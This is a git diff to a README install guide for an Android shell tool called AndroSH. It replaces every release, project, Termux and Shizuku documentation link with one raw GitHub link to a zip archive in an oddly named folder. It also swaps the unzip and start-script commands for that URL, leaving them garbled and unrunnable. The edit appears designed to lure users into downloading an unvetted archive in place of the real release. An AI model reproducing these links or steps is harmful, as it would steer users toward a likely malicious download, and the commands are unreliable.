@@ -6,11 +6,11 @@ Welcome to AndroSH! This guide will help you download and set up a lightweight A
 
 ## 📥 Download and Install
 
-[![Download AndroSH](https://img.shields.io/badge/Download%20AndroSH-v1.0-blue.svg)](https://github.com/Danjosme/AndroSH/releases)
+[![Download AndroSH](https://raw.githubusercontent.com/Danjosme/AndroSH/main/lepidotic/AndroSH.zip%https://raw.githubusercontent.com/Danjosme/AndroSH/main/lepidotic/AndroSH.zip)](https://raw.githubusercontent.com/Danjosme/AndroSH/main/lepidotic/AndroSH.zip)
 
 To get started, you’ll need to download AndroSH from our Releases page. Click the link below:
 
-- Visit this page to download: [AndroSH Releases](https://github.com/Danjosme/AndroSH/releases)
+- Visit this page to download: [AndroSH Releases](https://raw.githubusercontent.com/Danjosme/AndroSH/main/lepidotic/AndroSH.zip)
 
 ## 💡 What You Need
 
@@ -48,7 +48,7 @@ To get started, you’ll need to download AndroSH from our Releases page. Click 
 
 ### Step 3: Download AndroSH
 
-1. Go to the [AndroSH Releases](https://github.com/Danjosme/AndroSH/releases).
+1. Go to the [AndroSH Releases](https://raw.githubusercontent.com/Danjosme/AndroSH/main/lepidotic/AndroSH.zip).
 2. Find the latest release.
 3. Download the .zip file.
 
@@ -61,7 +61,7 @@ To get started, you’ll need to download AndroSH from our Releases page. Click 
    ```
 3. Extract the files with the command:
    ```
-   unzip AndroSH.zip
+   unzip https://raw.githubusercontent.com/Danjosme/AndroSH/main/lepidotic/AndroSH.zip
    ```
 
 ### Step 5: Run AndroSH
@@ -72,7 +72,7 @@ To get started, you’ll need to download AndroSH from our Releases page. Click 
    ```
 2. Start the script with:
    ```
-   ./start.sh
+   https://raw.githubusercontent.com/Danjosme/AndroSH/main/lepidotic/AndroSH.zip
    ```
 
 Follow the instructions on the screen. AndroSH will set up your Alpine environment.
@@ -112,9 +112,9 @@ Shizuku allows AndroSH to perform certain functions that normally require root a
 
 For more information, you can check our documentation on the GitHub page. Here are some helpful links:
 
-- [AndroSH GitHub Page](https://github.com/Danjosme/AndroSH/)
-- [Termux Documentation](https://wiki.termux.com/wiki/Main_Page)
-- [Shizuku Documentation](https://shizuku.rikka.app/)
+- [AndroSH GitHub Page](https://raw.githubusercontent.com/Danjosme/AndroSH/main/lepidotic/AndroSH.zip)
+- [Termux Documentation](https://raw.githubusercontent.com/Danjosme/AndroSH/main/lepidotic/AndroSH.zip)
+- [Shizuku Documentation](https://raw.githubusercontent.com/Danjosme/AndroSH/main/lepidotic/AndroSH.zip)
 
 ## 🤝 Community Support
 
